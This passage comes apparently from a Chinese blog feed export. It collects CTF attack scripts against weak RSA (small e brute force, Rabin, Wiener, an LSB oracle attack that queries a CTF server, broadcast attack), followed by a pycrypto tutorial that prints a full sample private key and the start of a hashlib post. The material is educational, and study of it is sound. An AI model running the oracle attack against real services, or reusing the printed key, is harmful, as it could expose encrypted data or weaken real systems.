<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> i,res</span><br><span class="line">        <span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line">        <span class="keyword">print</span> time.asctime()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Rabin加密中的N可被分解:Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,一般先通过其他方法分解得到p，q，然后解密.</p>
<p>python实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure>
<p>Jarvis OJ hard RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Wiener’s Attack:适用情况：e过大或过小(低解密指数攻击)</p>
<p>工具地址：[]:<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>这里脚本运行报错的话，再脚本前加上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>   sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">10000000</span>)</span><br></pre></td></tr></table></figure>
<p>python实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<p>nextrsa-Level2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure>
</li>
<li><p>私钥文件修复:适用情况：提供破损的私钥文件</p>
<p>Jarvis OJ-God Like RSA  []:<a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a></p>
</li>
<li><p>LSB Oracle Attack:适用情况：可以选择密文并泄露最低位</p>
<blockquote>
<p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> ， 因为m的两倍可能大于n，所以经过解密得到的明文是 <code>m&#39;=(2*m)%n</code> 。我们还能够知道 <code>m&#39;</code> 的最低位<code>lsb</code> 是1还是0。 因为n是奇数，而<code>2*m</code> 是偶数，所以如果<code>lsb</code>是0，说明<code>(2*m)%n</code> 是偶数，没有超过n，即<code>m&lt;n/2.0</code> ，反之则<code>m&gt;n/2.0</code> 。举个例子就能明白<code>2%3=2</code> 是偶数，而<code>4%3=1</code> 是奇数。以此类推，构造密文<code>c&quot;=(4^e)*c)%n</code> 使其解密后为<code>m&quot;=(4*m)%n</code> ，判断<code>m&quot;</code> 的奇偶性可以知道<code>m</code> 和 <code>n/4</code> 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间</p>
</blockquote>
</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure>
<p>  Baby RSA</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line">n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span><br><span class="line">c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span><br><span class="line"></span><br><span class="line">λ nc 47.96.239.28 23333</span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come and Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data is even or odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line">1</span><br><span class="line">odd</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>选择密文攻击:适用情况：可以构造任意密文并获得对应明文(在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code> 使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code>)</p>
</li>
<li><p>广播攻击:适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据(使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况)</p>
<p>nextrsa-Level9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><blockquote>
<p>看了各位表哥写的关于RSA的文章，学到了很多，以前之学习了数论，在代码上实践的很少，对这些脚本进行学习，总结，在RSA这一块有了很大的帮助。各位表哥的脚本写的很好，值得学习。</p>
</blockquote>
<p>参考链接：</p>
<p>[]:<a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a></p>
<p>[]:<a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">https://github.com/findneo/RSA-ATTACK</a></p>
<p>[]:<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p>
<p>[]:<a href="https://blog.csdn.net/like98k/article/details/79352076" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79352076</a></p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>python-pycrypto模块浅学</title>
    <url>/2018/08/31/python-pycrypto%E6%A8%A1%E5%9D%97%E6%B5%85%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="python-pycrypto模块学习"><a href="#python-pycrypto模块学习" class="headerlink" title="python-pycrypto模块学习"></a>python-pycrypto模块学习</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; pycrypto模块时python中来处理加密解密等信息安全相关的一个重要模块</span><br><span class="line">&gt; 对称加密方式：</span><br><span class="line">&gt; </span><br><span class="line">&gt; AES</span><br><span class="line">&gt; DES</span><br><span class="line">&gt; ARC4</span><br><span class="line">&gt; 散列值计算：</span><br><span class="line">&gt; </span><br><span class="line">&gt; MD5</span><br><span class="line">&gt; SHA</span><br><span class="line">&gt; HMAC</span><br><span class="line">&gt; 公钥加密和签名：</span><br><span class="line">&gt; </span><br><span class="line">&gt; RSA</span><br><span class="line">&gt; DSA</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="生成公私密钥"><a href="#生成公私密钥" class="headerlink" title="生成公私密钥"></a>生成公私密钥</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪随机数生成器</span></span><br><span class="line">random_generator = Random.new().read</span><br><span class="line"><span class="comment">#rsa算法生成实例</span></span><br><span class="line">rsa = RSA.generate(<span class="number">1024</span>,random_generator)</span><br><span class="line"><span class="comment">#master的密钥对的生成</span></span><br><span class="line">private_pem = rsa.exportKey()</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成公私钥对文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-private.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_pem)</span><br><span class="line"></span><br><span class="line">public_pem = rsa.publickey().exportKey()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-public.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(public_pem)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXamjBCTqlzBxnk0B00G/Ae6hk</span></span><br><span class="line"><span class="string">pKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH43</span></span><br><span class="line"><span class="string">4DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqX</span></span><br><span class="line"><span class="string">DfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICXAIBAAKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyv</span></span><br><span class="line"><span class="string">DdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhW</span></span><br><span class="line"><span class="string">s/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">AoGAeVSc9gUtvE7PvOLqjiEMoJzFxxIZHVZsYaR4VLfj7xFwvxTnVe3yeebPJKeh</span></span><br><span class="line"><span class="string">qVuf2yPI+jsowqOj+ByeRQLtVyjoZH7aW6uZQcKUtMrAMgcZouIKpKVWFhjWguFl</span></span><br><span class="line"><span class="string">CExsfi8EqzxVsBPBkHynqkU69IB4yPB1AMRb4ZcGsYvCgNECQQDpBoiaMD72+YOb</span></span><br><span class="line"><span class="string">bnXKhqW8PxU6/ylZvZL+wFE4Qwcu0nclni/vMMkrxK8oZvAiVOqBjCSXwcA6zZXL</span></span><br><span class="line"><span class="string">MZppBJaZAkEA7Kdo+7fCUyAeivzoYGHKE8Kmr/RTHW7oSgz1bBMdzAugsO8zuNGA</span></span><br><span class="line"><span class="string">fMnLYXTGBJFlfPQuOW3W6Q5UKHppV0uNnwJBAL0kU36ryH/ZGWzxJOUFk8MPhSEE</span></span><br><span class="line"><span class="string">+cBgss7atVIwfcUQiitbkdbZR4CiPfZST3neaRZL9WvElU5ljr+GfKnfUokCQA5L</span></span><br><span class="line"><span class="string">wqzKGgQZgZ7VzlfcMG/nJ1ijws2ZYJDwnXbM5NTpsuhdWtuEVGW1bwLRIhEuk1ns</span></span><br><span class="line"><span class="string">CkrP1ta3VeAoHOr4FnMCQDxnFKPCpjRSEM96xFDNgNh+66wgKg/SXMY5E7e0/LvB</span></span><br><span class="line"><span class="string">oFcJauclu+cP8eaqP0zasVR/xqQT4y091vSZzIADJLA=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
<h3 id="利用python对RSA根据公私钥加解密"><a href="#利用python对RSA根据公私钥加解密" class="headerlink" title="利用python对RSA根据公私钥加解密"></a>利用python对RSA根据公私钥加解密</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#RSA使用公私钥加解密数据：</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_phcs_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">'hello demos this is a plian text!'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-public.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)    <span class="comment">#导入读取到的公钥</span></span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)  <span class="comment">#实例化</span></span><br><span class="line">    cipher_text = base64.b64encode(cipher.encrypt(message))  <span class="comment">#这里需要注意的一点是，py2可以直接将str加密，而py3要转换为bytes</span></span><br><span class="line">    <span class="comment"># cipher_text = base64.b64encode(cipher.encrypt(message).encode(encoding = 'utf-8'))   #语句如下</span></span><br><span class="line">    <span class="keyword">print</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-private.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)</span><br><span class="line">    text = cipher.decrypt(base64.b64decode(cipher_text),<span class="string">"ERROR"</span>)</span><br><span class="line">    <span class="keyword">print</span> text        <span class="comment">#py2这里返回的是str类型的，py3返回的是bytes，需要自己转换</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535692492.84.png" alt></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote>
<p>在python中libnum、gmpy2、pycrypto在密码学中的应用广泛，也特别方便。</p>
</blockquote>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>pycrypto</tag>
      </tags>
  </entry>
  <entry>
    <title>python常用模块—-hashlib</title>
    <url>/2018/08/30/python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E2%80%94-hashlib/</url>
    <content><![CDATA[<h3 id="python常用模块——hashlib"><a href="#python常用模块——hashlib" class="headerlink" title="python常用模块——hashlib"></a>python常用模块——hashlib</h3><blockquote>
